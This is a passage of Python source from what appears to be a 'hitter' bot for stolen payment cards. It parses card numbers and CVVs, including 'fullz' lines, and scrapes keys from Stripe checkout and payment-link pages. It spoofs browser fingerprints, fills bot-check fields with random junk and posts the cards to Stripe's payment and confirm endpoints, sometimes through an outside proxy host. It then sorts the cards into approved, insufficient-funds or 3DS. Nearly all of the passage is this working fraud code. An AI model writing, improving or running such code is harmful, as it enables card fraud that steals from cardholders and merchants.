        chrome_ver = _m.group(1) if _m else '131'

    hdrs = {
        'Content-Type':     'application/x-www-form-urlencoded',
        'User-Agent':       ua,
        'Accept':           'application/json',
        'Accept-Language':  'en-US,en;q=0.9',
        'Accept-Encoding':  'gzip, deflate, br, zstd',
        'Origin':           origin,
        'Referer':          origin + '/',
        'Connection':       'keep-alive',
        'Cache-Control':    'no-cache',
        'Pragma':           'no-cache',
    }
    if is_chrome:
        platform = random.choice(['"Windows"', '"macOS"'])
        hdrs.update({
            'sec-ch-ua':          f'"Chromium";v="{chrome_ver}", "Google Chrome";v="{chrome_ver}", "Not=A?Brand";v="99"',
            'sec-ch-ua-mobile':   '?0',
            'sec-ch-ua-platform': platform,
            'sec-fetch-dest':     'empty',
            'sec-fetch-mode':     'cors',
            'sec-fetch-site':     'cross-site',
        })
    return hdrs


# ── StripV2-style session cache ────────────────────────────────────────────
# Extracted from stripv2.php concept: reuse same Stripe session info for
# multiple card checks instead of re-fetching on every card. TTL = 90s.
import threading as _co_threading
_CO_SESSION_CACHE     = {}       # {session_id: (info_dict, cached_at)}
_CO_SESSION_CACHE_TTL = 90       # seconds (safe margin under Stripe's 5min init window)
_CO_SESSION_LOCK      = _co_threading.Lock()


def _parse_checkout_url(checkout_url):
    """Extract sessionId and publicKey from a Stripe checkout URL.
    Enhanced: HTML fetch fallback when no #fragment (many modern URLs lack it).
    """
    import base64, re as _re
    try:
        checkout_url = requests.utils.unquote(checkout_url)
    except Exception:
        pass
    session_match = _re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', checkout_url)
    session_id = session_match.group(0) if session_match else None

    public_key = None
    site       = None

    # ── Try #fragment first (base64-XOR encoded) ────────────────────────
    frag_idx = checkout_url.find('#')
    if frag_idx != -1:
        try:
            fragment = checkout_url[frag_idx + 1:]
            decoded  = requests.utils.unquote(fragment)
            raw      = base64.b64decode(decoded + '==')
            xored    = ''.join(chr(b ^ _XOR_KEY) for b in raw)
            pk_match = _re.search(r'pk_(?:live|test)_[A-Za-z0-9_\-]+', xored)
            if pk_match:
                public_key = pk_match.group(0)
            site_match = _re.search(r'https?://[^\s"\']+', xored)
            if site_match:
                site = site_match.group(0)
        except Exception:
            pass

    # ── Fallback: fetch HTML and extract pk_live_ / pk_test_ ────────────
    if not public_key and session_id:
        try:
            _html_url = checkout_url.split('#')[0]  # clean URL without fragment
            _r = requests.get(
                _html_url, timeout=12,
                headers={
                    'User-Agent': random.choice(_CHROME_UAS),
                    'Accept': 'text/html,application/xhtml+xml,*/*;q=0.9',
                    'Accept-Language': 'en-US,en;q=0.9',
                },
                allow_redirects=True
            )
            if _r.status_code == 200:
                _html = _r.text
                # Pattern 1: JSON in __stripe_init / publishableKey
                _pm = _re.search(r'pk_(?:live|test)_[A-Za-z0-9_\-]{20,}', _html)
                if _pm:
                    public_key = _pm.group(0)
                # Pattern 2: merchant site URL
                _sm = _re.search(r'"merchant_url"\s*:\s*"(https?://[^"]+)"', _html)
                if _sm:
                    site = _sm.group(1)
        except Exception:
            pass

    return session_id, public_key, site

def _stripe_post(url, payload, headers=None, session=None, timeout=30, state=None, use_proxy=False):
    """POST to Stripe with retry on 429/5xx. Accepts optional requests.Session for reuse."""
    if use_proxy and url.startswith("https://"):
        url = f"https://stripe-hitter.onrender.com/proxy/{url}"
    hdrs = _stripe_fingerprint_headers(state=state)
    if headers:
        hdrs.update(headers)
    _sess = session or requests
    for attempt in range(2):
        try:
            r = _sess.post(url, data=payload, headers=hdrs, timeout=timeout)
            if r.status_code == 429 and attempt == 0:
                import time as _t; _t.sleep(2)
                continue
            if r.status_code in (500, 502, 503) and attempt == 0:
                import time as _t; _t.sleep(1)
                continue
            return r.status_code, r.json()
        except Exception as e:
            if attempt == 0:
                import time as _t; _t.sleep(1)
                continue
            return 0, {"error": {"message": str(e)}}
    return 0, {"error": {"message": "Max retries exceeded"}}

def _fetch_checkout_info(session_id, public_key, use_proxy=None):
    """Init checkout session and return parsed info dict.
    StripV2 optimization: result is cached per session_id for 90s.
    Cache is cleared automatically when session is consumed (APPROVED).
    """
    # ── Check cache first ───────────────────────────────────────────────
    now = time.time()
    with _CO_SESSION_LOCK:
        if session_id in _CO_SESSION_CACHE:
            cached_info, cached_at = _CO_SESSION_CACHE[session_id]
            if now - cached_at < _CO_SESSION_CACHE_TTL:
                return cached_info   # ✅ reuse — no Stripe API call
            else:
                del _CO_SESSION_CACHE[session_id]  # expired

    # ── Fetch fresh from Stripe ─────────────────────────────────────────
    _tz = _STATE_TZ.get(public_key[:2] if public_key else '', 'America/New_York')
    payload = {
        'key':              public_key,
        'eid':              'NA',
        'browser_locale':   'en-US',
        'browser_timezone': random.choice([
            'America/New_York', 'America/Chicago', 'America/Los_Angeles',
            'America/Denver', 'America/Phoenix',
        ]),
        'redirect_type':    'url',
    }
    sc, d = _stripe_post(
        f'https://api.stripe.com/v1/payment_pages/{requests.utils.quote(session_id, safe="")}/init',
        payload, timeout=20, use_proxy=use_proxy
    )
    if sc != 200:
        err_obj = (d.get('error') or {})
        err_msg = err_obj.get('message', f'HTTP {sc}')
        err_low = err_msg.lower()
        # Detect expired / invalid / already-paid session
        if sc == 404 or any(k in err_low for k in (
                'no such payment_page', 'no such checkout',
                'expired', 'does not exist', 'not found',
                'invalid payment page', 'already been completed',
                'payment link has expired', 'session has expired')):
            return {'_expired': True, '_error': err_msg}
        return {'_error': err_msg}

    # Amount — try every known field where Stripe stores it
    invoice   = d.get('invoice') or {}
    amount = (
        invoice.get('total')
        or invoice.get('amount_due')
        or invoice.get('amount_remaining')
        or d.get('amount_total')
        or d.get('amount_subtotal')
        or d.get('amount')
        or 0
    )
    currency  = (d.get('currency') or invoice.get('currency') or 'usd').upper()
    email     = d.get('customer_email', '') or ''
    checksum  = d.get('init_checksum', '') or ''
    config_id = d.get('config_id') or d.get('checkout_config_id')

    # Merchant name
    acct = d.get('account_settings') or {}
    merchant = acct.get('display_name') or acct.get('name') or 'Stripe'

    amount_str = f"{amount / 100:.2f} {currency}" if amount else "N/A"
    info = {
        'amount_raw': amount,
        'amount':     amount_str,
        'currency':   currency,
        'email':      email or 'test@example.com',
        'checksum':   checksum,
        'config_id':  config_id,
        'merchant':   merchant,
        '_raw':       d,
    }
    # ── Store in cache ──────────────────────────────────────────────────
    with _CO_SESSION_LOCK:
        _CO_SESSION_CACHE[session_id] = (info, time.time())
    return info

def ext_stripe_check(checkout_url, ccx, use_proxy=False):
    """Pure-Python Stripe checkout hitter — no Node.js required."""
    import time as _time, re as _re, random as _random
    t0 = _time.time()

    def _elapsed():
        return f"{round(_time.time() - t0, 2)}s"

    def _err(msg, **kw):
        return {"status": "error", "message": msg,
                "merchant": kw.get("merchant", "N/A"),
                "amount":   kw.get("amount",   "N/A"),
                "time":     _elapsed(), "url": ""}

    # ── Parse card ──────────────────────────────────────────────
    parts = _re.split(r'[\|/\s]+', ccx.strip())
    if len(parts) < 4:
        return _err("Invalid card format — use CC|MM|YY|CVV")
    cc_num, cc_mm, cc_yy, cc_cvv = parts[0], parts[1], parts[2], parts[3].strip()
    if len(cc_yy) == 4:
        cc_yy = cc_yy[2:]

    # ── Parse checkout URL ──────────────────────────────────────
    session_id, public_key, site = _parse_checkout_url(checkout_url)
    if not session_id:
        return _err("Could not extract session ID from checkout URL")
    if not public_key:
        return _err("Could not extract public key from checkout URL")

    # ── Fetch checkout info ─────────────────────────────────────
    info = _fetch_checkout_info(session_id, public_key, use_proxy=use_proxy)
    if not info:
        return _err("Failed to init checkout session")
    if '_expired' in info:
        return {"status": "expired",
                "message": "Checkout URL expired / already used",
                "merchant": "N/A", "amount": "N/A",
                "time": _elapsed(), "url": ""}
    if '_error' in info:
        emsg = info['_error']
        emsg_low = emsg.lower()
        if any(k in emsg_low for k in ('expired', 'not found', 'no such', 'does not exist')):
            return {"status": "expired",
                    "message": "Checkout URL expired / already used",
                    "merchant": "N/A", "amount": "N/A",
                    "time": _elapsed(), "url": ""}
        return _err(emsg)

    merchant   = info['merchant']
    amount_str = info['amount']
    email      = info['email']
    checksum   = info['checksum']
    config_id  = info['config_id']
    amount_raw = info['amount_raw']

    # ── Generate session fingerprint IDs (Pixel: Math.random() UUID) ────
    _guid, _muid, _sid = _gen_stripe_ids()

    # ── Create payment method ───────────────────────────────────
    _prof = _gen_us_profile()
    pm_payload = {
        'type':                       'card',
        'card[number]':               cc_num,
        'card[cvc]':                  cc_cvv,
        'card[exp_month]':            cc_mm,
        'card[exp_year]':             cc_yy,
        'billing_details[name]':      _prof['name'],
        'billing_details[email]':     email or _prof['email'],
        'billing_details[address][country]':     'US',
        'billing_details[address][line1]':        _prof['line1'],
        'billing_details[address][city]':         _prof['city'],
        'billing_details[address][state]':        _prof['state'],
        'billing_details[address][postal_code]':  _prof['zip'],
        'guid':                       _guid,
        'muid':                       _muid,
        'sid':                        _sid,
        'key':                        public_key,
        'payment_user_agent':         _STRIPE_UA,
        'client_attribution_metadata[client_session_id]':              session_id,
        'client_attribution_metadata[merchant_integration_source]':    'checkout',
        'client_attribution_metadata[merchant_integration_version]':   'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]':  'automatic',
    }
    if config_id:
        pm_payload['client_attribution_metadata[checkout_config_id]'] = config_id

    pm_sc, pm_d = _stripe_post('https://api.stripe.com/v1/payment_methods', pm_payload, use_proxy=use_proxy)

    if pm_sc != 200 or 'id' not in pm_d:
        err_obj   = pm_d.get('error', {})
        err_msg   = err_obj.get('message', 'Card tokenization failed')
        err_code  = err_obj.get('code', '')
        dec_code  = err_obj.get('decline_code', '')
        _emsg_l   = err_msg.lower()
        _code_l   = (err_code + ' ' + dec_code).lower()
        if 'insufficient' in _code_l or 'insufficient' in _emsg_l:
            status = 'insufficient_funds'
        elif any(k in _code_l for k in ('stolen', 'lost', 'pickup', 'restricted')):
            status = 'declined'
        elif any(k in _emsg_l for k in ('invalid', 'incorrect', 'expired', 'invalid_number')):
            status = 'declined'
        else:
            status = 'declined'
        return {"status": status, "message": err_msg,
                "merchant": merchant, "amount": amount_str,
                "time": _elapsed(), "url": ""}

    pm_id = pm_d['id']

    # ── Confirm payment ─────────────────────────────────────────
    cf_payload = {
        'eid':                          'NA',
        'payment_method':               pm_id,
        'consent[terms_of_service]':    'accepted',
        'expected_payment_method_type': 'card',
        'guid':                         _guid,
        'muid':                         _muid,
        'sid':                          _sid,
        'key':                          public_key,
        'version':                      _STRIPE_VERSION,
        'init_checksum':                checksum,
        'passive_captcha_token':        '',
        'client_attribution_metadata[client_session_id]':              session_id,
        'client_attribution_metadata[merchant_integration_source]':    'checkout',
        'client_attribution_metadata[merchant_integration_version]':   'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]':  'automatic',
    }
    if config_id:
        cf_payload['client_attribution_metadata[checkout_config_id]'] = config_id
    # Only send expected_amount when known — sending 0 causes "Your order has been updated" error
    if amount_raw and amount_raw > 0:
        cf_payload['expected_amount'] = str(amount_raw)

    cf_sc, cf_d = _stripe_post(
        f'https://api.stripe.com/v1/payment_pages/{requests.utils.quote(session_id, safe="")}/confirm',
        cf_payload
    )

    # ── Parse result ────────────────────────────────────────────
    import re as _re3
    pi     = cf_d.get('payment_intent', {}) or {}
    pi_st  = pi.get('status', '')
    err_o  = cf_d.get('error') or pi.get('last_payment_error') or {}
    if isinstance(err_o, str):
        err_o = {}

    success_url = cf_d.get('success_url') or cf_d.get('return_url') or ''
    _cf_raw_str = str(cf_d)
    _cf_raw_low = _cf_raw_str.lower()

    # ── Detect hCaptcha / bot challenge ─────────────────────────
    if (cf_d.get('captcha_required') or cf_d.get('challenge_required')
            or 'hcaptcha' in _cf_raw_low
            or 'captcha_token' in _cf_raw_low
            or (isinstance(err_o, dict) and 'captcha' in str(err_o).lower())):
        return {"status": "captcha",
                "message": "hCaptcha / Bot Detection triggered",
                "merchant": merchant, "amount": amount_str,
                "time": _elapsed(), "url": ""}

    # ── Detect expired session at confirm stage ──────────────────
    _err_msg_cf = (err_o.get('message', '') if isinstance(err_o, dict) else
                   (cf_d.get('error', {}) or {}).get('message', ''))
    if cf_sc == 404 or any(k in _err_msg_cf.lower() for k in (
            'expired', 'no such payment_page', 'not found', 'does not exist',
            'already been completed', 'session has expired')):
        return {"status": "expired",
                "message": "Checkout URL expired / already used",
                "merchant": merchant, "amount": amount_str,
                "time": _elapsed(), "url": ""}

    # ── Success detection (Pixel: checkResponseForSuccess) ──────
    # Layer 1: explicit status fields (inject.js: payment_status, charge_status, intent_status)
    _page_status    = cf_d.get('status', '')
    _payment_status = cf_d.get('payment_status', '')
    _charge_status  = cf_d.get('charge_status', '')
    _intent_status  = cf_d.get('intent_status', pi_st)
    _approved = (
        _page_status    in ('complete', 'paid', 'succeeded')
        or _payment_status in ('paid', 'succeeded', 'complete')
        or _charge_status  in ('paid', 'succeeded', 'captured')
        or _intent_status  in ('succeeded', 'paid')
        or pi_st == 'succeeded'
    )
    # Layer 2: Pixel regex — /payment\s*(was\s*)?successful/i
    if not _approved and _re3.search(r'payment\s*(was\s*)?successful', _cf_raw_str, _re3.I):
        _approved = True
    # Layer 3: success_url redirect present (Pixel: normalizeSuccessRedirectUrl)
    if not _approved and success_url and any(
            k in success_url.lower() for k in ('success', 'thank', 'confirmed', 'paid', 'complete')):
        _approved = True

    if _approved:
        status  = 'approved'
        message = 'Payment Approved'
    elif pi_st == 'requires_action' and pi.get('next_action'):
        status  = '3ds'
        message = '3DS Required'
    elif pi_st == 'requires_payment_method' or err_o:
        code    = err_o.get('code', err_o.get('decline_code', '')) if isinstance(err_o, dict) else ''
        emsg    = err_o.get('message', 'Card Declined') if isinstance(err_o, dict) else 'Card Declined'
        if 'insufficient' in code or 'insufficient' in emsg.lower():
            status = 'insufficient_funds'
        else:
            status = 'declined'
        message = emsg
    else:
        e2   = cf_d.get('error', {}) or {}
        emsg = e2.get('message', f'Unknown ({cf_sc})')
        code = e2.get('code', '')
        if 'insufficient' in code or 'insufficient' in emsg.lower():
            status = 'insufficient_funds'
        else:
            status = 'declined'
        message = emsg

    # ── Invalidate session cache on terminal states ─────────────────────────
    # APPROVED = session consumed. DECLINED = session still valid (keep cache).
    if status in ('approved', 'expired'):
        with _CO_SESSION_LOCK:
            _CO_SESSION_CACHE.pop(session_id, None)

    return {
        "status":   status,
        "message":  message,
        "merchant": merchant,
        "amount":   amount_str,
        "time":     _elapsed(),
        "url":      success_url,
    }

def ext_stripe_api_alive():
    """Always True — pure Python implementation, no external server needed."""
    return True

# /co — fully local (no external API dependency)
# Kept for reference only — _co_ext_call no longer uses these
# _CO_EXT_API  = "https://gold-newt-367030.hostingersite.com/Api/stripe.php"  # expired
# _CO_STRIPV2  = "http://178.128.110.246/stripv2.php"                          # removed
_CO_EXT_KEY   = os.environ.get("CO_EXT_KEY", "")   # unused but kept for env compat

# /h hitter API — gold-newt hostinger (hitter.php — JSON response)
_H_API        = "https://gold-newt-367030.hostingersite.com/Api/hitter.php"
_H_KEY        = os.environ.get("H_KEY", "TRIALAPI")

# ── DLX: Gateway provider detector (from dlx_4uto_h1tter) ────────────────────
def _dlx_detect_provider(url: str, html: str = "") -> str:
    """Detect payment gateway from URL and/or HTML content."""
    url_l = url.lower()
    if 'stripe.com' in url_l:
        return 'Stripe'
    if 'checkout.com' in url_l:
        return 'Checkout.com'
    if 'shopify.com' in url_l or 'myshopify.com' in url_l:
        return 'Shopify'
    if 'paypal.com' in url_l or 'paypal' in url_l:
        return 'PayPal'
    if 'braintree' in url_l or 'braintreegateway.com' in url_l:
        return 'Braintree'
    if 'adyen.com' in url_l or 'adyen' in url_l:
        return 'Adyen'
    if 'squareup.com' in url_l or 'square' in url_l:
        return 'Square'
    if 'mollie.com' in url_l or 'mollie' in url_l:
        return 'Mollie'
    if 'klarna.com' in url_l or 'klarna' in url_l:
        return 'Klarna'
    if 'authorize.net' in url_l or 'authorizenet' in url_l:
        return 'Authorize.Net'
    if html:
        if 'stripe.com' in html:
            return 'Stripe'
        if 'checkout.com' in html or '"Frames"' in html:
            return 'Checkout.com'
        if 'window.Shopify' in html or 'cdn.shopify.com' in html:
            return 'Shopify'
        if 'paypal' in html.lower() or 'window.paypal' in html:
            return 'PayPal'
        if 'braintree' in html.lower():
            return 'Braintree'
        if 'adyen' in html.lower():
            return 'Adyen'
        if 'woocommerce' in html.lower() and 'stripe' in html.lower():
            return 'WooCommerce+Stripe'
        if 'woocommerce' in html.lower():
            return 'WooCommerce'
        if 'bigcommerce' in html.lower():
            return 'BigCommerce'
    return 'Unknown'

# ── DLX: Static URL analyzer (from dlx_4uto_h1tter URLAnalyzer) ──────────────
def _dlx_url_analyze(url: str) -> dict:
    """Fetch checkout URL and extract merchant, product name, amount via static HTML analysis."""
    result = {'merchant': 'Unknown', 'product': 'Unknown', 'amount': None, 'currency': 'USD', 'provider': 'Unknown', 'success': False}
    try:
        hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
        resp = requests.get(url, timeout=15, headers=hdrs, verify=False, allow_redirects=True)
        if resp.status_code != 200:
            return result
        html = resp.text

        result['provider'] = _dlx_detect_provider(url, html)

        # ── Merchant name ──────────────────────────────────────────────────
        for pat in [
            r'"business_name"\s*:\s*"([^"]{2,60})"',
            r'"merchant_name"\s*:\s*"([^"]{2,60})"',
            r'"company"\s*:\s*"([^"]{2,60})"',
            r'<meta\s+property="og:site_name"\s+content="([^"]{2,60})"',
            r'<title>(?:Pay\s+)?([^|<]{2,50})(?:\s*\||\s*-|\s*–)?',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m and m.group(1).strip() not in ('', 'Stripe', 'Checkout', 'Shopify', 'PayPal'):
                result['merchant'] = m.group(1).strip()
                break

        # ── Product name ───────────────────────────────────────────────────
        for pat in [
            r'"name"\s*:\s*"([^"]{2,80})"',
            r'"product_name"\s*:\s*"([^"]{2,80})"',
            r'"description"\s*:\s*"([^"]{2,80})"',
            r'<meta\s+property="og:title"\s+content="([^"]{2,80})"',
            r'"line_items".*?"name"\s*:\s*"([^"]{2,80})"',
        ]:
            m = re.search(pat, html, re.IGNORECASE | re.DOTALL)
            if m and m.group(1).strip() not in ('', result['merchant']):
                result['product'] = m.group(1).strip()
                break

        # ── Amount ─────────────────────────────────────────────────────────
        for pat in [
            r'"amount"\s*:\s*(\d{2,8})',
            r'"amount_subtotal"\s*:\s*(\d{2,8})',
            r'"amount_total"\s*:\s*(\d{2,8})',
            r'data-amount="(\d{2,8})"',
            r'"total"\s*:\s*(\d{2,8})',
        ]:
            m = re.search(pat, html)
            if m:
                cents = int(m.group(1))
                if cents > 0:
                    result['amount'] = f"${cents/100:.2f}"
                    break

        if not result['amount']:
            for pat in [
                r'\$\s*(\d+(?:\.\d{2})?)',
                r'Total:?\s*\$\s*([\d,]+\.?\d*)',
            ]:
                m = re.search(pat, html)
                if m:
                    result['amount'] = f"${m.group(1)}"
                    break

        # ── Currency ───────────────────────────────────────────────────────
        cur_m = re.search(r'"currency"\s*:\s*"([A-Z]{3})"', html)
        if cur_m:
            result['currency'] = cur_m.group(1)

        result['success'] = True
    except Exception:
        pass
    return result

def _h_call(checkout_url, ccx):
    """Local Playwright-based hitter — replaces dead hitter.php API.
    Returns dict with status/message/merchant/amount/time/raw keys."""
    return _dlx_hit_single(checkout_url, ccx, timeout=120)

def _h_word(d):
    s = d.get("status", "")
    if s == "approved":         return "Approve"
    if s == "insufficient_funds": return "Funds"
    if s == "3ds":              return "Otp"
    if s == "key_error":        return "KeyError"
    return "Decline"

def _h_emoji(d):
    s = d.get("status", "")
    if s == "approved":           return "✅"
    if s == "insufficient_funds": return "💰"
    if s == "3ds":                return "⚠️"
    if s == "key_error":          return "🔑"
    return "❌"

def _co_ext_call(checkout_url, ccx, use_proxy=False):
    """
    Fully local /co checkout hitter — no external API dependency.
    Replaces gold-newt API (gold-newt-367030.hostingersite.com) with
    equivalent local logic. Same response dict format.

    Routing:
      buy.stripe.com  → _stripe_paylink_check  (stripe1$ flow)
      cs_live_/cs_test_ checkout URLs  → ext_stripe_check  (session-cached)
      Any other URL   → ext_stripe_check  (direct)
    """
    url_l = checkout_url.strip().lower()

    # ── Route 1: buy.stripe.com payment links ────────────────────────────
    if "buy.stripe.com" in url_l:
        r   = _stripe_paylink_check(checkout_url, ccx, use_proxy=use_proxy)
        st  = r.get("status",  "declined")
        msg = r.get("message", "Unknown")
        elapsed = r.get("elapsed", 0)
        if st == "3ds":
            norm_st = "3ds"
        elif st == "approved":
            norm_st = "approved"
        elif st == "error":
            norm_st = "error"
        else:
            norm_st = "declined"
        return {"status": norm_st, "message": msg,
                "merchant": "Stripe Payment Link",
                "amount": "N/A", "time": f"{elapsed}s",
                "url": checkout_url}

    # ── Route 2: Standard Stripe Checkout URL (cs_live_ / cs_test_) ────────
    # Uses session cache (StripV2 concept) — fast on bulk checks
    return ext_stripe_check(checkout_url, ccx, use_proxy=use_proxy)

# ── Shared UI helpers ────────────────────────────────────────────
_CC_RE      = re.compile(r'(\d{13,19})[|/ ](\d{1,2})[|/ ](\d{2,4})[|/ ](\d{3,4})')
# Fullz format: 4309678000422066 0929 799 John Smith ...  (MMYY as 4-digit block)
_CC_FULLZ_RE = re.compile(r'\b(\d{13,19})\s+(\d{4})\s+(\d{3,4})(?:\s|$)')

def _extract_cc(line: str):
    """Extract CC in num|mm|yy|cvv format from a raw/messy line. Returns None if not found."""
    # Standard format: 4111|12|26|123  or  4111 12 26 123  or  4111/12/26/123
    m = _CC_RE.search(line)
    if m:
        num, mm, yy, cvv = m.group(1), m.group(2), m.group(3), m.group(4)
        if len(yy) == 4:
            yy = yy[2:]
        return f"{num}|{mm}|{yy}|{cvv}"
    # Fullz format: 4309678000422066 0929 799 John Smith P.O. Box ...
    # MMYY is a single 4-digit block e.g. 0929 → mm=09 yy=29
    m2 = _CC_FULLZ_RE.search(line)
    if m2:
        num  = m2.group(1)
        mmyy = m2.group(2)
        cvv  = m2.group(3)
        mm   = mmyy[:2]
        yy   = mmyy[2:]
        # Sanity check: mm 01-12, yy reasonable
        if 1 <= int(mm) <= 12:
            return f"{num}|{mm}|{yy}|{cvv}"
    return None

def _flag(code):
    """Country code (e.g. 'US') → flag emoji 🇺🇸"""
    code = (code or '').upper().strip()
    if len(code) != 2 or not code.isalpha():
        return ''
    return chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397)

def _prog_bar(done, total, width=10):
    """Progress bar: ▓▓▓▓▓░░░░░"""
    if total == 0:
        return '░' * width
    filled = round(width * done / total)
    return '▓' * filled + '░' * (width - filled)

def _fmt_result_line(status_emoji, cc, result):
    """Compact single result line for BIN/multi/txt modes — one-word status."""
    st  = result.get('status', '').lower()
    msg = result.get('message', '').lower()

    if st == 'approved':
        word = 'Approve'
    elif st == '3ds' or any(k in msg for k in ('3d','otp','authenticate','authentication')):
        word = 'Otp'
    elif st == 'insufficient_funds' or 'insufficient' in msg:
        word = 'Funds'
    else:
        word = 'Decline'

    return f"{status_emoji} <b>{word}</b>  ❯  <code>{cc}</code>"

# ── Stripe Payment Link checker (buy.stripe.com) — stripe1$ method ──────────
def _stripe_paylink_check(buy_url, card_str, proxy_dict=None, use_proxy=False):
    """Full stripe1$ flow for buy.stripe.com payment links. Returns dict(status,message,elapsed)."""
    try:
        t0 = time.time()
        parts = card_str.strip().split("|")
        if len(parts) < 4:
            return {"status": "error", "message": "Invalid card format", "elapsed": 0}
        number   = parts[0].strip()
        exp_mon  = parts[1].strip().zfill(2)
        exp_yr   = parts[2].strip()
        if len(exp_yr) == 4:
            exp_yr = exp_yr[-2:]
        cvc = parts[3].strip()
        pl_id = buy_url.rstrip("/").split("/")[-1]
        UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0")
        sess = requests.Session()
        if proxy_dict:
            sess.proxies = proxy_dict
        # 1 — fetch buy page
        r = sess.get(buy_url, headers={"accept": "text/html,*/*", "user-agent": UA}, timeout=15)
        html = r.text
        m = re.search(r"pk_live_[A-Za-z0-9]+", html);  pk_live = m.group(0) if m else None
        m = re.search(r"cs_live_[A-Za-z0-9]+", html);  cs_id   = m.group(0) if m else None
        
        def _p(u): return f"https://stripe-hitter.onrender.com/proxy/{u}" if use_proxy and u.startswith("https://") else u
        
        # 2 — merchant-ui-api
        mh = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded",
              "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/", "user-agent": UA}
        pl_r = sess.post(_p(f"https://merchant-ui-api.stripe.com/payment-links/{pl_id}"),
                         headers=mh, data=urllib.parse.urlencode({"eid": "NA", "browser_locale": "en",
                         "browser_timezone": "America/New_York", "referrer_origin": "https://google.com"}), timeout=15)
        pl_data = pl_r.json() if pl_r.ok else {}
        cs_id   = pl_data.get("session_id") or cs_id
        cfg_id  = pl_data.get("config_id")
        init_cs = pl_data.get("init_checksum")
        site_key= pl_data.get("site_key")
        currency= pl_data.get("currency") or "usd"
        lig     = pl_data.get("line_item_group") or {}
        exp_amt = lig.get("total") or lig.get("due") or lig.get("subtotal")
        exp_amt = int(exp_amt) if exp_amt is not None else None
        li_id   = (lig.get("line_items") or [{}])[0].get("id") if lig.get("line_items") else None
        if not pk_live:
            return {"status": "error", "message": "pk_live not found", "elapsed": round(time.time()-t0, 2)}
        if not cs_id:
            return {"status": "error", "message": "cs_live not found", "elapsed": round(time.time()-t0, 2)}
        js_id = str(uuid.uuid4()); muid = str(uuid.uuid4()); guid = str(uuid.uuid4()); sid_v = str(uuid.uuid4())
        ah = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded",
              "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": UA}
        # 3 — elements/sessions
        es_r = sess.get(_p("https://api.stripe.com/v1/elements/sessions"), headers=ah, params={
            "deferred_intent[mode]": "payment",
            "deferred_intent[amount]": str(exp_amt or 100),
            "deferred_intent[currency]": currency,
            "deferred_intent[payment_method_types][0]": "card",
            "deferred_intent[capture_method]": "automatic_async",
            "currency": currency, "key": pk_live,
            "elements_init_source": "payment_link", "hosted_surface": "checkout",
            "referrer_host": "buy.stripe.com", "stripe_js_id": js_id,
            "locale": "en", "type": "deferred_intent", "checkout_session_id": cs_id,
        }, timeout=15)
        es = es_r.json() if es_r.ok else {}
        cfg_id = cfg_id or es.get("config_id")
        if not exp_amt:
            s2 = es.get("session") or es
            exp_amt = int(s2.get("amount_total") or s2.get("amount_subtotal") or 100)
        bh = {**ah, "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/"}
        # 4 — update line item
        if li_id:
            sess.post(_p(f"https://api.stripe.com/v1/payment_pages/{cs_id}"), headers=bh,
                      data=urllib.parse.urlencode({"eid": "NA",
                          "updated_line_item_amount[line_item_id]": li_id,
                          "updated_line_item_amount[unit_amount]": str(exp_amt), "key": pk_live}), timeout=10)
        # 5 — create payment method
        pm_r = sess.post(_p("https://api.stripe.com/v1/payment_methods"), headers=bh,
                         data=urllib.parse.urlencode({
                             "type": "card", "card[number]": number, "card[cvc]": cvc,
                             "card[exp_month]": exp_mon, "card[exp_year]": exp_yr,
                             "billing_details[name]": "John Doe",
                             "billing_details[email]": f"john{random.randint(100,999)}@gmail.com",
                             "billing_details[address][country]": "US",
                             "guid": guid, "muid": muid, "sid": sid_v, "key": pk_live,
                             "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
                             "client_attribution_metadata[client_session_id]": js_id,
                             "client_attribution_metadata[checkout_session_id]": cs_id,
                             "client_attribution_metadata[merchant_integration_source]": "checkout",
                             "client_attribution_metadata[merchant_integration_version]": "payment_link",
                             "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                             "client_attribution_metadata[checkout_config_id]": cfg_id or "",
                         }), timeout=15)
        pm_d = pm_r.json()
        pm_id = pm_d.get("id") if pm_r.ok else None
        if not pm_id:
            err = pm_d.get("error", {})
            return {"status": "declined", "message": err.get("message", "Tokenization failed"), "elapsed": round(time.time()-t0, 2)}
        # 6 — confirm
        init_cs = init_cs or "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
        js_cs   = "".join(random.choices(string.ascii_letters + string.digits + "~^=[]|%#{}<>?`", k=50))
        pxvid   = str(uuid.uuid4())
        rv_ts   = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))
        exp_s   = str(exp_amt)
        conf_r  = sess.post(_p(f"https://api.stripe.com/v1/payment_pages/{cs_id}/confirm"), headers=bh,
                            data=urllib.parse.urlencode({
                                "eid": "NA", "payment_method": pm_id,
                                "expected_amount": exp_s,
                                "last_displayed_line_item_group_details[subtotal]": exp_s,
                                "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
                                "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
                                "last_displayed_line_item_group_details[total_discount_amount]": "0",
                                "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
                                "expected_payment_method_type": "card",
                                "guid": guid, "muid": muid, "sid": sid_v, "key": pk_live,
                                "version": "148043f9d7", "init_checksum": init_cs,
                                "js_checksum": js_cs, "pxvid": pxvid,
                                "passive_captcha_token": "", "passive_captcha_ekey": site_key or "",
                                "rv_timestamp": rv_ts,
                                "client_attribution_metadata[client_session_id]": js_id,
                                "client_attribution_metadata[checkout_session_id]": cs_id,
                                "client_attribution_metadata[merchant_integration_source]": "checkout",
                                "client_attribution_metadata[merchant_integration_version]": "payment_link",
                                "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                                "client_attribution_metadata[checkout_config_id]": cfg_id or "",
                            }, safe=""), timeout=20)
